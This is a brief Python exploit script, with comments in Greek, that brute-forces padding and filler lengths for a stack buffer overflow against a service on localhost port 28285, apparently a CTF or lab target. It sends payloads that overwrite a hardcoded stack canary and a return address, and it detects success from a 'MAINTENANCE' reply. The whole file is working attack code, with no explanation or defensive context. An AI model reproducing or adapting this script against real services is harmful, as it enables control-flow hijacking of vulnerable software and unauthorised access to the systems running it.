import socket

host, port = '127.0.0.1', 28285
canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
addr = b"\x26\x92\x04\x08"

def check():
    # Δοκιμάζουμε padding από 110 έως 130
    for pad in range(118, 128):
        print(f"Testing Pad {pad}...", end="\r")
        # Δοκιμάζουμε junk από 0 έως 40 (με βήμα 4)
        for junk in range(0, 44, 4):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect((host, port))
                
                payload = b"A" * pad + canary + b"B" * junk + addr + b"\n"
                s.sendall(payload)
                
                # Αν το exploit πετύχει, ο server θα στείλει το Maintenance message
                response = s.recv(1024)
                if b"MAINTENANCE" in response:
                    print(f"\n[!!!] FOUND IT!")
                    print(f"PAD: {pad}")
                    print(f"JUNK: {junk}")
                    return
                s.close()
            except:
                continue
    print("\n[!] No luck. Maybe the canary changed?")

check()